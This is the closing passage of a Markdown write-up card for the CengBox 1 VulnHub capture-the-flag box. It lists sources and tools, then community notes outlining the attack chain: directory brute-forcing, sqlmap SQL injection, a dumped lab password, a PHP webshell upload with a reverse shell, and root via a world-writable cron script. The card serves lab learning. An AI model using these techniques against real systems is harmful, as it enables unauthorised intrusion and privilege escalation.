  - [Hacking Articles — CengBox: 1 Vulnhub Walkthrough (pspy path)](https://www.hackingarticles.in/cengbox-1-vulnhub-walkthrough/)
  - [HackNos — CengBox 1 Vulnhub Walkthrough](https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/)
  - [vshaliii — Cengbox:1 ~Vulnhub Walkthrough](https://medium.com/@vshaliii/cengbox-1-vulnhub-walkthrough-e76b2bc37322)
  - [hack-tips — VulnHub CengBox Walkthrough (lxd path)](https://hack-tips.com/2020-06-18/vulnhub-cengbox-walkthrough/)
  - [caerdydd.security — CengBox CTF Walkthrough](https://security.caerdydd.wales/cengbox-ctf-walkthrough/)
- Tools / background:
  - [`pspy` — monitor Linux processes without root privileges](https://github.com/DominicBreuker/pspy)
  - [sqlmap user's manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
  - [GTFOBins — lxd](https://gtfobins.github.io/gtfobins/lxd/) · [docker](https://gtfobins.github.io/gtfobins/docker/)
  - [saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) · [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [`crontab(5)`](https://man7.org/linux/man-pages/man5/crontab.5.html) · [`sudoers(5)`](https://man7.org/linux/man-pages/man5/sudoers.5.html) · [`systemd.exec(5)` sandboxing](https://www.freedesktop.org/software/systemd/man/systemd.exec.html)
  - [PHP `password_hash`](https://www.php.net/manual/en/function.password-hash.php) · [`imagecreatefromstring`](https://www.php.net/manual/en/function.imagecreatefromstring.php)
  - [Apache `RemoveHandler` / `php_flag engine off`](https://httpd.apache.org/docs/current/mod/mod_mime.html#removehandler)
  - [`dirb`](https://tools.kali.org/web-applications/dirb) · [`gobuster`](https://github.com/OJ/gobuster) · [SecLists](https://github.com/danielmiessler/SecLists)
  - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) · [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


### Community notes — consensus, pitfalls and alternative routes (cross-checked against the sources below):

- **Consensus chain:** nmap (`22/80`) → `dirb` with `big.txt` → `/masteradmin/` → `dirb ... -X .php` → `login.php`/`upload.php` → `sqlmap --forms` SQLi on `login.php` → dump DB `cengbox` (credentials table **`admin`**) → `masteradmin:C3ng0v3R00T1!` → login → upload a `.ceng` shell (executed as PHP) → `www-data` → `su cengover` (DB password = system password) → `pspy` → overwrite `/opt/md5check.py` (777, root cron) → root.
- **Common pitfall:** `common.txt` (and even a default `dirb` run) misses `/masteradmin/` — escalate the wordlist to `big.txt` first, then re-run with `-X .php`. Two writeups report the default list found nothing usable.
- **Common pitfall:** uploads silently "fail" because only `.ceng` is accepted — one writeup lost significant time simply not seeing the error message at the top of the page. Read every error before assuming a dead end.
- **Common pitfall:** `--dump` is painfully slow because the confirmed injection is partly time-based (every character costs a `SLEEP()`), so read `--tables` first and dump targeted tables (`-D cengbox -T admin`), not `--dump-all`.
- **Alternative tooling:** sqlmap can be fed a Burp-intercepted request (`sqlmap -r request.txt`) instead of `--forms`, and the shells can be Metasploit `php/meterpreter/reverse_tcp` / `python/meterpreter` payloads (`multi/handler`, `web_delivery`) instead of hand-built netcat reverse shells — same endpoints, different toolkit.
- **Dead end (documented):** SUID enumeration (`find / -perm -u=s`) yields nothing usable; `/usr/bin/at` is present but refuses to run. Not every standard check pays off — keep going.
- **⚠️ Verification note:** the credentials table is named **`admin`**, not `users`, and the `lxd` group escape this card mentions is **not** reproduced by the verified writeups — the documented root path is the world-writable `/opt/md5check.py` (root cron, mode 777).
- **Naming confusion:** one writeup (Bootlesshacker) calls the shell user `cengbox`; HackNos and Hacking Articles — and the box itself — use **`cengover`**.
- **Hygiene:** back up `/opt/md5check.py` before overwriting and restore it afterwards so the box works for the next learner. `chmod +x` is enough for pspy — do not `chmod 777` your own tools.
- **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/cengbox-1-vulnhub-walkthrough/) · [HackNos](https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/) · [Bootlesshacker](https://www.bootlesshacker.com/cengbox-ctf-walkthrough/)

---

## 10. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 22 and 80 with the Ubuntu 18.04 banner
- [ ] `images/02-dirb.png` — `dirb -X .php` finding `login.php` and `upload.php`
- [ ] `images/03-sqlmap.png` — `sqlmap` dumping `cengbox.admin`
- [ ] `images/04-shell.png` — the `.ceng` webshell and the reverse shell as `www-data`
- [ ] `images/05-user-flag.png` — `su cengover` and `user.txt`
- [ ] `images/06-root-flag.png` — `pspy` output, `/opt/md5check.py`, and `root.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
